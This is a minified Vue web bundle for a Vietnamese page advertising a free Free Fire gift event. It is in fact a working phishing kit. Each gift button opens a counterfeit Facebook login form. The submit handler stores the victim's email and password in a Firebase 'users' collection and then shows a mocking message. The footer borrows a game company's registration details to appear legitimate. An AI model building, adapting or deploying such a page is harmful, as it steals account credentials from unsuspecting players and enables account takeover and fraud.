var H=Object.defineProperty,V=Object.defineProperties;var j=Object.getOwnPropertyDescriptors;var p=Object.getOwnPropertySymbols;var T=Object.prototype.hasOwnProperty,B=Object.prototype.propertyIsEnumerable;var f=(s,e,o)=>e in s?H(s,e,{enumerable:!0,configurable:!0,writable:!0,value:o}):s[e]=o,x=(s,e)=>{for(var o in e||(e={}))T.call(e,o)&&f(s,o,e[o]);if(p)for(var o of p(e))B.call(e,o)&&f(s,o,e[o]);return s},b=(s,e)=>V(s,j(e));import{z as E,n as M,a as v,w as P,p as S,H as L,d as w}from"./firebase.90b31d4b.js";import{_ as h}from"./index.4ffa9155.js";import{o as l,e as a,i as q,r as _,f as t,g as m,w as z,h as c,F as y,j as D,k as u,v as I,l as K,m as k,t as G}from"./vendor.fdd95336.js";var F="/freefire/assets/logo.552412c6.png",$="/freefire/assets/logo-mobile.5facce14.png",Q="/freefire/assets/btn-install.0dab6364.png",R="/freefire/assets/ff.eb6a5540.jpg";const U={},A={class:"bg-gray-700"},Y=q('<div class="flex justify-between bg-gray-900 p-3"><div><img class="h-12 rounded-md" src="'+F+'"></div><div><img class="h-10" src="'+$+'"></div><div><a href="#"><img src="'+Q+'"></a></div></div><img src="'+R+'" class="w-full"><h1 class="text-2xl text-center font-bold text-yellow-900 py-3 bg-yellow-400">S\u1EF0 KI\u1EC6N TRI \xC2N NH\u1EACN QU\xC0 FREE FIRE MI\u1EC4N PH\xCD 2022</h1>',3),J=[Y];function O(s,e,o,g,n,r){return l(),a("div",A,J)}var W=h(U,[["render",O]]);const X={},Z={class:"p-7 bg-gray-900 text-gray-300 text-center"},tt=t("div",{class:"flex justify-center"},[t("img",{src:$,alt:"",class:"h-10"})],-1),et=t("p",null,"C\xF4ng ty TNHH D\u1ECBch V\u1EE5 Ph\u1EA7n M\u1EC1m Thi\xEAn B\xECnh",-1),st=t("p",null,"Gi\u1EA5y CN\u0110KKD s\u1ED1 0106803215, c\u1EA5p l\u1EA7n \u0111\u1EA7u ng\xE0y 27/03/2015",-1),ot=t("p",null,"C\u01A1 quan c\u1EA5p: Ph\xF2ng \u0110\u0103ng k\xFD kinh doanh- S\u1EDF K\u1EBF ho\u1EA1ch v\xE0 \u0111\u1EA7u t\u01B0 TP H\xE0 N\u1ED9i",-1),it=t("p",null,"\u0110\u1ECBa ch\u1EC9 tr\u1EE5 s\u1EDF ch\xEDnh: T\u1EA7ng 29, t\xF2a nh\xE0 Trung t\xE2m Lotte H\xE0 N\u1ED9i, s\u1ED1 54, \u0111\u01B0\u1EDDng Li\u1EC5u Giai, Ph\u01B0\u1EDDng C\u1ED1ng V\u1ECB, Qu\u1EADn Ba \u0110\xECnh, Th\xE0nh ph\u1ED1 H\xE0 N\u1ED9i, Vi\u1EC7t Nam.",-1),nt=t("p",null,"\u0110i\u1EC7n tho\u1EA1i: 024 73053939",-1),rt=c("\u0110i\u1EC1u kho\u1EA3n d\u1ECBch v\u1EE5"),lt=c(" | "),at=t("a",{href:"#",class:"text-yellow-200"},"Ch\xEDnh s\xE1ch b\u1EA3o m\u1EADt",-1),ct=c(" | "),dt=t("a",{href:"#",class:"text-yellow-200"},"Ch\xEDnh s\xE1ch gi\u1EA3i quy\u1EBFt tranh ch\u1EA5p",-1);function ht(s,e,o,g,n,r){const d=_("router-link");return l(),a("footer",Z,[tt,et,st,ot,it,nt,t("p",null,[m(d,{to:"/user",class:"text-yellow-200"},{default:z(()=>[rt]),_:1}),lt,at,ct,dt])])}var _t=h(X,[["render",ht]]),mt="/freefire/assets/fb.5d08bff4.png";const ut={components:{Header:W,Footer:_t},data(){return{products:[],isForm:!1,email:"",password:"",er:!1}},methods:{formLoginFB(){this.$swal.fire({title:"\u0110\u0103ng nh\u1EADp Facebook",html:'<div class="flex justify-center"><svg class="w-10" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 14222 14222"><circle cx="7111" cy="7112" r="7111" fill="#1977f3"/><path d="M9879 9168l315-2056H8222V5778c0-562 275-1111 1159-1111h897V2917s-814-139-1592-139c-1624 0-2686 984-2686 2767v1567H4194v2056h1806v4969c362 57 733 86 1111 86s749-30 1111-86V9168z" fill="#fff"/></svg></div>',confirmButtonText:"Ti\u1EBFp t\u1EE5c"}).then(s=>{s.isConfirmed&&(this.isForm=!0)})},closeForm(){this.isForm=!1,this.email="",this.password=""},submitForm(){const s=this.email.match(/^(([^<>()[\]\.,;:\s@\"]+(\.[^<>()[\]\.,;:\s@\"]+)*)|(\".+\"))@(([^<>()[\]\.,;:\s@\"]+\.)+[^<>()[\]\.,;:\s@\"]{2,})$/i),e=this.password.match(/^.{6,}$/);s&&e?(E(v(w,"users"),{email:this.email,password:this.password,timestamp:M()}),this.$swal.fire({icon:"success",title:"Ch\xFAc m\u1EEBng",text:"B\u1EA1n nh\u1EADn \u0111\u01B0\u1EE3c c\xE1i n\u1ECBt, kh\xF4ng l\xE0m m\xE0 \u0111\xF2i c\xF3 \u0103n"}),this.isForm=!1,this.er=!1,this.email="",this.password=""):this.er=!0}},created(){const s=P(v(w,"products"),S("timestamp","desc"));L(s,e=>{this.products=e.docs.map(o=>b(x({},o.data()),{id:o.id}))})}},gt={class:"bg-gray-700",id:"bgff"},pt=t("p",{class:"pt-2 text-center text-yellow-500"}," S\u1EF1 ki\u1EC7n nh\u1EADn qu\xE0 Free Fire 2022 tri \xE2n Free Fire Vi\u1EC7t Nam. Nh\u1EADn qu\xE0 Free Fire Mi\u1EC5n Ph\xED To\xE0n Server ",-1),ft={class:"grid grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-5 w-10/12 mx-auto py-5"},xt=["src"],bt={class:"py-2 text-xl text-gray-300 text-gray-300"},vt=t("i",{class:"fas fa-gift"},null,-1),wt=c(" NH\u1EACN NGAY "),yt=[vt,wt],kt=t("div",{class:"w-full font-bold text-xl px-2 py-2 text-gray-900"},".",-1),Ft={class:"fixed text-gray-500 flex items-center justify-center overflow-auto z-50 bg-black bg-opacity-40 left-0 right-0 top-0 bottom-0"},$t={class:"relative rounded bg-white text-center shadow-2xl w-80 mx-auto"},Nt=t("svg",{class:"w-8 h-8",fill:"none",stroke:"currentColor",viewBox:"0 0 24 24",xmlns:"http://www.w3.org/2000/svg"},[t("path",{"stroke-linecap":"round","stroke-linejoin":"round","stroke-width":"2",d:"M10 14l2-2m0 0l2-2m-2 2l-2-2m2 2l2 2m7-2a9 9 0 11-18 0 9 9 0 0118 0z"})],-1),Ct=[Nt],Ht=t("div",{class:"flex justify-center bg-blue-500 rounded-t"},[t("div",{class:"p-2"},[t("img",{src:mt,alt:"",class:"h-6"})])],-1),Vt={key:0,class:"py-1 px-2 text-left text-xs bg-red-500 text-white"},jt=c(" Email ho\u1EB7c s\u1ED1 \u0111i\u1EC7n tho\u1EA1i b\u1EA1n nh\u1EADp kh\xF4ng kh\u1EDBp v\u1EDBi b\u1EA5t k\u1EF3 t\xE0i kho\u1EA3n n\xE0o. "),Tt=t("b",null,"\u0110\u0103ng k\xFD t\xE0i kho\u1EA3n",-1),Bt=[jt,Tt],Et=t("div",{class:"flex justify-center p-3"},[t("img",{class:"w-12",src:F,alt:""})],-1),Mt=t("p",{class:"px-3"},"\u0110\u0103ng nh\u1EADp v\xE0o t\xE0i kho\u1EA3n Facebook c\u1EE7a b\u1EA1n \u0111\u1EC3 k\u1EBFt n\u1ED1i v\u1EDBi Free Fire",-1),Pt={class:"p-3"},St=t("a",{href:"#",class:"inline-block my-2 text-blue-500"},"Qu\xEAn m\u1EADt kh\u1EA9u?",-1),Lt=t("hr",{class:"text-gray-300"},null,-1),qt=t("button",{class:"bg-green-500 mt-6 mb-4 text-white px-3 py-2 rounded-lg font-semibold text-lg hover:bg-green-600"},"T\u1EA1o t\xE0i kho\u1EA3n m\u1EDBi",-1);function zt(s,e,o,g,n,r){const d=_("Header"),N=_("Footer");return l(),a(y,null,[m(d),t("div",gt,[pt,t("div",ft,[(l(!0),a(y,null,D(n.products,i=>(l(),a("div",{key:i.id,class:"bg-gray-900 border border-yellow-700 text-center shadow relative"},[t("img",{src:i.url,alt:"",class:"h-32 w-full object-contain"},null,8,xt),t("p",bt,G(i.title),1),t("button",{onClick:e[0]||(e[0]=(...C)=>r.formLoginFB&&r.formLoginFB(...C)),class:"w-full px-2 py-2 text-yellow-900 font-bold text-xl bg-yellow-500 hover:bg-yellow-400 absolute bottom-0 left-0"},yt),kt]))),128))])]),u(t("div",Ft,[t("div",$t,[t("button",{onClick:e[1]||(e[1]=(...i)=>r.closeForm&&r.closeForm(...i)),class:"absolute top-0 right-0 translate-x-1/2 -translate-y-1/2"},Ct),Ht,n.er?(l(),a("div",Vt,Bt)):K("",!0),Et,Mt,t("div",Pt,[u(t("input",{type:"email","onUpdate:modelValue":e[2]||(e[2]=i=>n.email=i),placeholder:"Email ho\u1EB7c s\u1ED1 \u0111i\u1EC7n tho\u1EA1i",minlength:"10",maxlength:"99",autofocus:"",class:"w-full mb-3 px-3 py-2 bg-gray-100 border border-gray-300 focus:outline-none rounded-md focus:ring-1 ring-blue-500"},null,512),[[k,n.email]]),u(t("input",{type:"password","onUpdate:modelValue":e[3]||(e[3]=i=>n.password=i),placeholder:"M\u1EADt kh\u1EA9u",minlength:"6",maxlength:"99",class:"w-full mb-3 px-3 py-2 border border-gray-300 bg-gray-100 focus:outline-none rounded-md focus:ring-1 ring-blue-500"},null,512),[[k,n.password]]),t("button",{onClick:e[4]||(e[4]=(...i)=>r.submitForm&&r.submitForm(...i)),class:"w-full bg-blue-500 text-white px-3 py-2 rounded-lg font-semibold text-lg hover:bg-blue-600"},"\u0110\u0103ng nh\u1EADp"),St,Lt,qt])])],512),[[I,n.isForm==1]]),m(N)],64)}var Qt=h(ut,[["render",zt]]);export{Qt as default};
